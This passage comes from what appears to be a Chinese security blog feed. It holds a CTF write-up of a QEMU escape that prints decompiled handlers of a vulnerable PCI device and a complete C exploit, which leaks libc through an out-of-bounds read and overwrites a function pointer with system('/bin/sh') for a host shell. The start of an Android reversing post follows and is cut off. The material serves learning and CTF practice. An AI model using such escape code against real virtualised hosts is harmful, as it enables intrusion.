ds_0-&gt;log_arg = <span class="number">0LL</span>;</span><br><span class="line">  ds_0-&gt;status = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_fd = <span class="number">2LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;log_format, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;log_format));</span><br><span class="line">  ds_0-&gt;log_handler = (LogHandlerFunc)&amp;dprintf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>MMIO 初始化</strong>：  <ul><li>设备通过 <code>MMIO</code> 与 <code>Guest</code> 交互，大小为 <code>2KB</code>，操作由 <code>ccb_dev_mmio_ops</code> 实现。</li><li>需确保 <code>ccb_dev_mmio_ops</code> 已定义（如 <code>read/write</code> 回调）。</li></ul></li><li><strong>PCI BAR 注册</strong>：  <ul><li><code>Guest</code> 访问 <code>PCI BAR 0</code> 时，会映射到设备的 <code>MMIO</code> 区域。</li></ul></li><li><strong>设备状态初始化</strong>：  <ul><li>缓冲区、日志、状态寄存器等均被清零或设为默认值。</li></ul></li><li><strong>日志机制</strong>：  <ul><li>默认日志输出到 <code>stderr</code>，可通过修改 <code>log_fd</code> 和 <code>log_handler</code> 重定向。</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> __cdecl <span class="title">ccb_dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> val; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">55</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_read&quot;</span>);</span><br><span class="line">  val = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      val = ds_0-&gt;index;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      val = ds_0-&gt;buffer[ds_0-&gt;index];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      val = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      val = ds_0-&gt;log_arg;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      val = ds_0-&gt;status;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现如果index域可控，那么就有个越界读取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">85</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      ds_0-&gt;index = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      ds_0-&gt;buffer[ds_0-&gt;index] = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( ds_0-&gt;log_handler )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;<span class="built_in">log_handler</span>(ds_0-&gt;log_fd, ds_0-&gt;log_format, ds_0-&gt;log_arg);</span><br><span class="line">        ds_0-&gt;status = <span class="number">1074749</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;status = <span class="number">16388413</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      ds_0-&gt;log_arg = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      ds_0-&gt;log_fd = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现index可控，且有个越界写，在0xC选项中有个函数执行</p><p>那么思路就是：</p><p>覆盖log_handler为system，然后log_fd为&#x2F;bin&#x2F;sh的地址，就能实现qemu的逃逸，妙！！</p><p>而要与MMIO进行交互 就得通过<code>resource0</code></p><h4 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_system_offset 0x50d70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_dprintf_offset 0x60a10</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">getMMIOBase</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = <span class="built_in">open</span>(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getMMIOBase</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem Resource0Base: %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x12</span>);<span class="comment">//set index-&gt;12=fprintf_high</span></span><br><span class="line">    <span class="type">uint32_t</span> index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_fprintf = <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line">    libc_fprintf=libc_fprintf&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    libc_fprintf += <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);<span class="comment">//dprintf</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="type">uint64_t</span> libcbase=libc_fprintf-libc_dprintf_offset;</span><br><span class="line">    <span class="type">uint64_t</span> system=libcbase+libc_system_offset;</span><br><span class="line">    <span class="type">uint64_t</span> bin_sh=libcbase+<span class="number">0x1d8678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase: 0x%llx.\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] bin_sh: 0x%llx.\n&quot;</span>, bin_sh);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system: 0x%llx.\n&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x13</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(bin_sh&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(system&amp;<span class="number">0xffffffff</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0xc</span>,<span class="number">0xbeef</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的wp是由<strong>youlin</strong>师傅写的，只做学习作用</p></blockquote><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>先用gdb加载这个qemu的符号表，然后再通过attach pid来附加上这个qemu进程</p><h4 id="偏移寻找"><a href="#偏移寻找" class="headerlink" title="偏移寻找"></a>偏移寻找</h4><p>本地qemu的偏移是通过本地的libc给的，会跟远程的不一样，因此要先在本地打通之后，再修改成远程给的docker的libc的偏移，最后就能成功getshell</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh:turning off NDELAY mode</span></span><br></pre></td></tr></table></figure><p>本地获得shell之后可能会遇到这种情况，youlin师傅说这可能是管道的冲突，但是远程是可以打通的</p><p>在 Guest 用户态 C 代码中对 <code>mmio_mem</code> 指针的操作，最终会触发 QEMU Host 进程中相应的设备模拟代码的执行</p><p>当你通过这个指针进行读写操作时：</p><ol><li>Guest OS 将<strong>虚拟地址转换为物理地址</strong>。</li><li>QEMU 拦截对这些特定物理地址的访问。</li><li>QEMU 调用其内部对应的设备模型 MMIO 处理函数（如 <code>ccb_dev_mmio_write</code> &#x2F; <code>read</code> 或针对该设备的其他特定函数），并将偏移量和（对于写入）数据传递给这些函数</li></ol><h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">timeout <span class="number">300</span> ./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">1</span>G \</span><br><span class="line">   -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz<span class="number">-5.0</span><span class="number">.5</span>-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><p>删除timeout，可以发现漏洞应该在pipeline上·</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;qemu逃逸学习&quot;&gt;&lt;a href=&quot;#qemu逃逸学习&quot; class=&quot;headerlink&quot; title=&quot;qemu逃逸学习&quot;&gt;&lt;/a&gt;qemu逃逸学习&lt;/h1&gt;&lt;p&gt;CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个p</summary>
      
    
    
    
    <category term="qemu" scheme="http://s1nec-1o.github.io/categories/qemu/"/>
    
    <category term="虚拟机" scheme="http://s1nec-1o.github.io/categories/qemu/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="qemu逃逸" scheme="http://s1nec-1o.github.io/tags/qemu%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向之Wiki篇</title>
    <link href="http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/"/>
    <id>http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/</id>
    <published>2025-04-14T06:44:43.000Z</published>
    <updated>2025-04-14T06:56:13.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态分析java层"><a href="#静态分析java层" class="headerlink" title="静态分析java层"></a>静态分析java层</h1><h2 id="2014-ASIS-Cyber-Security-Contest-Finals-Numdroid"><a href="#2014-ASIS-Cyber-Security-Contest-Finals-Numdroid" class="headerlink" title="2014 ASIS Cyber Security Contest Finals Numdroid"></a>2014 ASIS Cyber Security Contest Finals Numdroid</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    ArrayTools.<span class="built_in">each_with_index</span>(buttons, <span class="keyword">new</span> <span class="built_in">EachIndexAction</span>&lt;Integer&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.EachIndexAction</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">action</span>(<span class="keyword">final</span> <span class="type">int</span> i, Integer element) &#123;</span><br><span class="line">            ((Button) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(element.<span class="built_in">intValue</span>())).<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1.1</span></span><br><span class="line">                @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.<span class="built_in">clicked</span>(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mScreen = (EditText) <span class="built_in">findViewById</span>(R.id.editText1);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setEnabled</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">this</span>.mOk = (ImageButton) <span class="built_in">findViewById</span>(R.id.ok);</span><br><span class="line">    <span class="keyword">this</span>.mDel = (ImageButton) <span class="built_in">findViewById</span>(R.id.del);</span><br><span class="line">    <span class="keyword">this</span>.mOk.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.2</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">ok_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mDel.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.3</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">del_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先遍历按钮数组，并进行初始化和设置点击事件 <code>MainActivity.this.clicked(i);</code></li><li>然后对OK和del按钮进行初始化并设置点击事件分别为 <code>MainActivity.this.ok_clicked();</code> 和 <code>MainActivity.this.del_clicked();</code></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">clicked</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;number: &quot;</span> + i);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">append</span>((CharSequence) Integer.<span class="built_in">toString</span>(i)));</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;current Pass: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击按钮时候会先log记录下来，然后再将数字转为String显示到屏幕上，然后再log记录下当前的passwd</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">ok_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;clicked password: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">    boolean result = Verify.<span class="built_in">isOk</span>(<span class="keyword">this</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>());</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;password is Ok? : &quot;</span> + result);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        Intent i = <span class="keyword">new</span> <span class="built_in">Intent</span>(<span class="keyword">this</span>, (Class&lt;?&gt;) LipSum.<span class="keyword">class</span>);</span><br><span class="line">        Bundle b = <span class="keyword">new</span> <span class="built_in">Bundle</span>();</span><br><span class="line">        b.<span class="built_in">putString</span>(<span class="string">&quot;flag&quot;</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>().<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>));</span><br><span class="line">        i.<span class="built_in">putExtras</span>(b);</span><br><span class="line">        <span class="built_in">startActivity</span>(i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.<span class="built_in">makeText</span>(<span class="keyword">this</span>, 